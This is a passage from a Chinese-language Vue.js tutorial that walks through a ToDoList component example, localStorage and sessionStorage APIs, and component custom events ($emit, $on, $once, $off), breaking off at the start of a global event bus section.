<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;ul class=&quot;todo-main&quot;&gt;</span><br><span class="line">    &lt;MyItem</span><br><span class="line">        v-for=&quot;item in todos&quot;</span><br><span class="line">        :key=&quot;item.id&quot;</span><br><span class="line">        :todoObj=&quot;item&quot;</span><br><span class="line">        :checkTodo=&quot;checkTodo&quot;</span><br><span class="line">        :deleteTodo=&quot;deleteTodo&quot;</span><br><span class="line">    &gt;&lt;/MyItem&gt;</span><br><span class="line">  &lt;/ul&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import MyItem from &#x27;./MyItem.vue&#x27;</span><br><span class="line"></span><br><span class="line">export default &#123;</span><br><span class="line">  name: &quot;MyList&quot;,</span><br><span class="line">  components: &#123;</span><br><span class="line">    MyItem</span><br><span class="line">  &#125;,</span><br><span class="line">  props: &#123;</span><br><span class="line">    todos: &#123;</span><br><span class="line">      type: Object</span><br><span class="line">    &#125;,</span><br><span class="line">    checkTodo: &#123;</span><br><span class="line">      type: Function</span><br><span class="line">    &#125;,</span><br><span class="line">    deleteTodo: &#123;</span><br><span class="line">      type: Function</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><code>MyItem.vue</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;li&gt;</span><br><span class="line">    &lt;label&gt;</span><br><span class="line">      &lt;input type=&quot;checkbox&quot;</span><br><span class="line">             :checked=&quot;todoObj.done&quot;</span><br><span class="line">             @change=&quot;handleCheck(todoObj.id)&quot;&gt;</span><br><span class="line">      &lt;span&gt;&#123;&#123;todoObj.title&#125;&#125;&lt;/span&gt;</span><br><span class="line">    &lt;/label&gt;</span><br><span class="line">    &lt;button class=&quot;btn btn-danger&quot; @click=&quot;handleDelete(todoObj.id)&quot;&gt;删除&lt;/button&gt;</span><br><span class="line">  &lt;/li&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">  name: &quot;MyItem&quot;,</span><br><span class="line">  props: &#123;</span><br><span class="line">    todoObj: &#123;</span><br><span class="line">      type: Object</span><br><span class="line">    &#125;,</span><br><span class="line">    checkTodo: &#123;</span><br><span class="line">      type: Function</span><br><span class="line">    &#125;,</span><br><span class="line">    deleteTodo: &#123;</span><br><span class="line">      type: Function</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    handleCheck(id) &#123;</span><br><span class="line">      this.checkTodo(id)</span><br><span class="line">    &#125;,</span><br><span class="line">    handleDelete(id) &#123;</span><br><span class="line">      if(confirm(&#x27;确定删除吗？&#x27;)) &#123;</span><br><span class="line">        console.log(id)</span><br><span class="line">        this.deleteTodo(id)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h4 id="3-11-1-6-底部统计功能"><a href="#3-11-1-6-底部统计功能" class="headerlink" title="3.11.1.6.底部统计功能"></a>3.11.1.6.底部统计功能</h4><p>数组过滤方法：<code>reduce</code>，<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/ce508fade509">https://www.jianshu.com/p/ce508fade509</a></p>
<p><code>MyFooter</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;todo-footer&quot;&gt;</span><br><span class="line">    &lt;label&gt;</span><br><span class="line">      &lt;input type=&quot;checkbox&quot;&gt;</span><br><span class="line">    &lt;/label&gt;</span><br><span class="line">    &lt;span&gt;</span><br><span class="line">      &lt;span&gt;已完成&#123;&#123;doneTotal&#125;&#125;&lt;/span&gt; / 全部&#123;&#123;todos.length&#125;&#125;</span><br><span class="line">    &lt;/span&gt;</span><br><span class="line">    &lt;button class=&quot;btn btn-danger&quot;&gt;清空已完成任务&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">  name: &quot;MyFooter&quot;,</span><br><span class="line">  props: &#123;</span><br><span class="line">    todos: &#123;</span><br><span class="line">      type: Object</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  computed: &#123;</span><br><span class="line">    doneTotal() &#123;</span><br><span class="line">      return this.todos.reduce((pre, current) =&gt; pre + (current.done ? 1 : 0), 0)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>



<h4 id="3-11-1-7-底部交互功能"><a href="#3-11-1-7-底部交互功能" class="headerlink" title="3.11.1.7.底部交互功能"></a>3.11.1.7.底部交互功能</h4><p><code>App.vue</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div id=&quot;root&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;todo-container&quot;&gt;</span><br><span class="line">      &lt;div class=&quot;todo-wrap&quot;&gt;</span><br><span class="line">        &lt;MyHeader :addTodo=&quot;addTodo&quot;&gt;&lt;/MyHeader&gt;</span><br><span class="line">        &lt;MyList</span><br><span class="line">            :todos=&quot;todos&quot;</span><br><span class="line">            :checkTodo=&quot;checkTodo&quot;</span><br><span class="line">            :deleteTodo=&quot;deleteTodo&quot;</span><br><span class="line">        &gt;&lt;/MyList&gt;</span><br><span class="line">        &lt;MyFooter</span><br><span class="line">            :todos=&quot;todos&quot;</span><br><span class="line">            :checkAllDone=&quot;checkAllDone&quot;</span><br><span class="line">            :clearAllToDo=&quot;clearAllToDo&quot;</span><br><span class="line">        &gt;&lt;/MyFooter&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import MyHeader from &#x27;./components/MyHeader.vue&#x27;</span><br><span class="line">import MyList from &#x27;./components/MyList.vue&#x27;</span><br><span class="line">import MyFooter from &#x27;./components/MyFooter.vue&#x27;</span><br><span class="line"></span><br><span class="line">export default &#123;</span><br><span class="line">  name: &#x27;App&#x27;,</span><br><span class="line">  components: &#123;</span><br><span class="line">    MyHeader,</span><br><span class="line">    MyList,</span><br><span class="line">    MyFooter</span><br><span class="line">  &#125;,</span><br><span class="line">  data() &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      todos: [</span><br><span class="line">        &#123;id: &#x27;001&#x27;, title: &#x27;吃饭&#x27;, done: true&#125;,</span><br><span class="line">        &#123;id: &#x27;002&#x27;, title: &#x27;睡觉&#x27;, done: true&#125;,</span><br><span class="line">        &#123;id: &#x27;003&#x27;, title: &#x27;打豆豆&#x27;, done: false&#125;,</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    addTodo(todoObj) &#123;</span><br><span class="line">      this.todos.push(todoObj)</span><br><span class="line">    &#125;,</span><br><span class="line">    checkTodo(id) &#123;</span><br><span class="line">      this.todos.forEach(item =&gt; &#123;</span><br><span class="line">        if (item.id === id) item.done = !item.done</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;,</span><br><span class="line">    deleteTodo(id) &#123;</span><br><span class="line">      this.todos = this.todos.filter(item =&gt; item.id !== id)</span><br><span class="line">    &#125;,</span><br><span class="line">    checkAllDone(done) &#123;</span><br><span class="line">      this.todos.forEach(item =&gt; item.done = done)</span><br><span class="line">    &#125;,</span><br><span class="line">    clearAllToDo()&#123;</span><br><span class="line">      this.todos = this.todos.filter(item =&gt; !item.done)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><code>MyFooter.vue</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">  name: &quot;MyFooter&quot;,</span><br><span class="line">  props: &#123;</span><br><span class="line">    todos: &#123;</span><br><span class="line">      type: Object</span><br><span class="line">    &#125;,</span><br><span class="line">    checkAllDone: &#123;</span><br><span class="line">      type: Function</span><br><span class="line">    &#125;,</span><br><span class="line">    clearAllToDo: &#123;</span><br><span class="line">      type: Function</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  computed: &#123;</span><br><span class="line">    isAll: &#123;</span><br><span class="line">      get() &#123;</span><br><span class="line">        return this.total === this.doneTotal &amp;&amp; this.total &gt; 0</span><br><span class="line">      &#125;,</span><br><span class="line">      set(value) &#123;</span><br><span class="line">        this.checkAllDone(value)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    total() &#123;</span><br><span class="line">      return this.todos.length</span><br><span class="line">    &#125;,</span><br><span class="line">    doneTotal() &#123;</span><br><span class="line">      return this.todos.reduce((pre, current) =&gt; pre + (current.done ? 1 : 0), 0)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    clearAll() &#123;</span><br><span class="line">      this.clearAllToDo()</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="3-11-2-小结：ToDoList案例"><a href="#3-11-2-小结：ToDoList案例" class="headerlink" title="3.11.2.小结：ToDoList案例"></a>3.11.2.小结：<code>ToDoList</code>案例</h3><ul>
<li><p>组件化编码流程</p>
<ul>
<li>拆分静态组件：组件要按功能点拆分，命名不要和<code>html</code>冲突</li>
<li>实现动态组件：考虑好数据存放位置，数据是一个组件在用，还是一些组件在用<ul>
<li>一个组件在用：放在组件自身即可</li>
<li>一些组件在用：放在他们共同的父组件上（状态提升）</li>
</ul>
</li>
<li>交互实现：从绑定事件开始</li>
</ul>
</li>
<li><p><code>props</code>适用于：</p>
<ul>
<li>父组件 &#x3D;&#x3D;&gt; 子组件通信</li>
<li>子组件 &#x3D;&#x3D;&gt; 父组件通信（要求父组件先给子组件一个函数）</li>
</ul>
</li>
<li><p>使用<code>v-model</code>时要切记：<code>v-model</code>绑定的值不能是<code>props</code>传过来的值，因为<code>props</code>是不可以修改的</p>
</li>
<li><p><code>props</code>传过来的若是对象类型的值，修改对象中的属性时<code>Vue</code>不会报错，但不推荐这样做</p>
</li>
</ul>
<h3 id="3-11-3-浏览器本地存储"><a href="#3-11-3-浏览器本地存储" class="headerlink" title="3.11.3.浏览器本地存储"></a>3.11.3.浏览器本地存储</h3><p><code>webStorage</code>包含<code>localStorage</code>和<code>sessionStorage</code>，这两个的<code>api</code>是一样的，存储内容大小一般在<code>5MB</code>左右，浏览器端一般通过<code>Window.sessionStorage</code>和<code>Window.localStorage</code>来实现本地存储机制</p>
<p>相关<code>api</code>：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 新增数据</span></span><br><span class="line"><span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&#x27;msg&#x27;</span>, <span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 移除数据</span></span><br><span class="line"><span class="variable language_">localStorage</span>.<span class="title function_">removeItem</span>(<span class="string">&#x27;msg&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> p = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;sai&#x27;</span>,</span><br><span class="line">    <span class="attr">age</span>: <span class="number">18</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 新增对象类型数据</span></span><br><span class="line"><span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&#x27;person&#x27;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(p))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取对象类型的数据</span></span><br><span class="line"><span class="keyword">const</span> res = localStrage.<span class="title function_">getItem</span>(<span class="string">&#x27;person&#x27;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">parse</span>(res))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 清空所有数据</span></span><br><span class="line"><span class="variable language_">localStorage</span>.<span class="title function_">clear</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>备注：</p>
<ul>
<li><code>sessionStorage</code>存储的内容会随着浏览器的窗口关闭而消失</li>
<li><code>localStorage</code>存储的内容，需要手动清除才会消失</li>
<li><code>xxx.getItem(xxx)</code>，如果获取不到，返回值为<code>null</code></li>
<li><code>JSON.parse(null)</code>的结果依然是<code>null</code></li>
</ul>
<h2 id="3-12-组件自定义事件"><a href="#3-12-组件自定义事件" class="headerlink" title="3.12.组件自定义事件"></a>3.12.组件自定义事件</h2><h3 id="3-12-1-组件自定义事件的基本使用"><a href="#3-12-1-组件自定义事件的基本使用" class="headerlink" title="3.12.1.组件自定义事件的基本使用"></a>3.12.1.组件自定义事件的基本使用</h3><p>之前我们通过<code>props</code>配置项，可以实现子组件给父组件传递数据，这种方式需要父组件先定义方法，子组件再定义<code>props</code>接受，然后再使用该方法</p>
<p>也可以通过<code>v-on</code>给组件绑定自定义事件：</p>
<ul>
<li><p>子组件使用<code>v-on</code>绑定<code>myMethod</code>自定义事件，该事件的回调是<code>demo</code></p>
<p><code>App.vue</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Student v-on:myMethod=&quot;demo&quot;/&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>父组件中定义<code>demo</code>回调函数，子组件中定义<code>myMethod</code>自定义事件</p>
<p><code>App.vue</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div id=&quot;root&quot;&gt;</span><br><span class="line">    &lt;MyStudent  @myMethod=&quot;demo&quot;&gt;&lt;/MyStudent&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    import MyStudent from &quot;@/components/MyStudent&quot;;</span><br><span class="line">    export default &#123;</span><br><span class="line">        name: &#x27;App&#x27;,</span><br><span class="line">        components: &#123;</span><br><span class="line">            MyStudent</span><br><span class="line">        &#125;,</span><br><span class="line">        methods: &#123;</span><br><span class="line">            demo(value) &#123;</span><br><span class="line">                console.log(value)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><code>MyStudent</code></p>
<p>子组件中通过组件实例对象上的<code>$emit</code>向外传递自定义事件，同时也可以传递参数</p>
<p>父组件在接受定义回调时，可以定义参数接受子组件的传值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;button @click=&quot;myClick&quot;&gt;点击传值&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    export default &#123;</span><br><span class="line">        name: &quot;MyStudent&quot;,</span><br><span class="line">        data() &#123;</span><br><span class="line">            return &#123;</span><br><span class="line">              name: &#x27;子组件的数据&#x27;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        methods: &#123;</span><br><span class="line">            myClick() &#123;</span><br><span class="line">                this.$emit(&#x27;myMethod&#x27;, this.name)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>另外一种写法：</p>
<p>在<code>App.vue</code>中的<code>mounted</code>生命周期函数中，使用组件实例对象的<code>$on</code>方法调用：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">	&lt;Student ref=&quot;student&quot;/&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    export default &#123;</span><br><span class="line">        methods: &#123;</span><br><span class="line">            demo(value) &#123;</span><br><span class="line">                console.log(value)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        mounted() &#123;</span><br><span class="line">            this.$refs.student.$on(&#x27;myMethod&#x27;, this.demo)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>该方式灵活性更强，比如可以设置延时</p>
<p>如果想要自定义事件只触发一次，可以使用<code>$once</code>方法:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="property">$refs</span>.<span class="property">student</span>.$once(<span class="string">&#x27;myMethod&#x27;</span>, <span class="variable language_">this</span>.<span class="property">demo</span>)</span><br></pre></td></tr></table></figure>

<p>或</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Student @myMethod.once=&quot;demo&quot;/&gt;</span><br></pre></td></tr></table></figure>



<p>如果子组件自定义事件传递了很多参数，而我们只需要特定的参数，可以使用解构赋值来接受参数</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">myClick</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.$emit(<span class="string">&#x27;myMethod&#x27;</span>, <span class="variable language_">this</span>.<span class="property">name</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>父组件的回调函数：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">demo</span>(<span class="params">value, ...params</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(value, params) <span class="comment">// value对象第一个传递进来的参数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3-12-2-解绑自定义事件"><a href="#3-12-2-解绑自定义事件" class="headerlink" title="3.12.2.解绑自定义事件"></a>3.12.2.解绑自定义事件</h3><ul>
<li><p>解绑一个自定义事件</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.$off(<span class="string">&#x27;myMethod&#x27;</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>解绑多个自定义事件</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.$off([<span class="string">&#x27;myMethod&#x27;</span>,<span class="string">&#x27;myMethod2&#x27;</span>])</span><br></pre></td></tr></table></figure>

<p>或</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.$off() <span class="comment">// 什么都不传，表示解绑全部的自定义事件</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>销毁了当前组件实例之后，其身上定义的所有自定义事件都失效了</p>
</li>
</ul>
<h3 id="3-12-3-小结：组件自定义事件"><a href="#3-12-3-小结：组件自定义事件" class="headerlink" title="3.12.3.小结：组件自定义事件"></a>3.12.3.小结：组件自定义事件</h3><ul>
<li><p>一种组件间通信的方式，适用于子组件 &#x3D;&#x3D;&gt; 父组件</p>
</li>
<li><p>使用场景：<code>A</code>是父组件，<code>B</code>是子组件，<code>B</code>想给<code>A</code>传数据，那么就要在<code>A</code>中给<code>B</code>绑定自定义事件（事件的回调函数在<code>A</code>中）</p>
</li>
<li><p>绑定自定义事件</p>
<ul>
<li><p>第一种方式：在父组件中：<code>&lt;Demo @myMethod=&quot;demo&quot;/&gt;</code>或<code>&lt;Demo v-on:myMethod=&quot;demo&quot;&gt;</code></p>
</li>
<li><p>第二种方式，在父组件中：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="title class_">Demo</span> ref=<span class="string">&quot;xxx&quot;</span>/&gt;</span><br><span class="line">    </span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="title function_">mounted</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">$refs</span>.<span class="property">xxx</span>.$on(<span class="string">&#x27;myMethod&#x27;</span>, <span class="variable language_">this</span>.<span class="property">demo</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>若想让自定义事件只能触发一次，可以使用<code>once</code>修饰符，或<code>$once</code>方法</p>
</li>
</ul>
</li>
<li><p>触发自定义事件：<code>this.$emit(&#39;myMethod&#39;, data)</code></p>
</li>
<li><p>解绑自定义事件：<code>this.$off(&#39;myMethod&#39;)</code></p>
</li>
<li><p>组件上也可以绑定原生<code>dom</code>事件，但要使用<code>native</code>修饰符，否则会当作自定义事件处理</p>
</li>
<li><p>注意：通过<code>this.$refs.xxx.$on(&#39;myMethod&#39;, 回调)</code>绑定自定义事件时，回调要么配置在<code>methods</code>中，要么就用箭头函数，如果不用箭头函数，此时函数中的<code>this</code>指向默认指向子组件，对于数据的操作会出问题</p>
</li>
<li><p>可以使用自定义事件改写<code>toDoList</code>案例</p>
<ul>
<li>父给子传数据，不用修改</li>
<li>父给子传函数，最终的目标是希望拿到子组件的数据，可以使用子组件的自定义事件来修改</li>
</ul>
</li>
</ul>
<h2 id="3-13-全局事件总线"><a href="#3-13-全局事件总线" class="headerlink" title="3.13.全局事件总线"></a>3.13.全局事件总线</h2><p>作用：实现任意组件通信</p>
<p>要求：</p>
<ul>
<li><strong>所有</strong>的组件都能看到它</li>
<li>事件总线上得有<code>$on</code>、<code>$off</code>和<code>$emit</code>方法</li>
</ul>
<p>小结：</p>
<ul>
<li><p>全局事件总线，是一种组件间通信的方式，适用于任意组件间通信</p>
</li>
<li><p>安装全局事件总线</p>
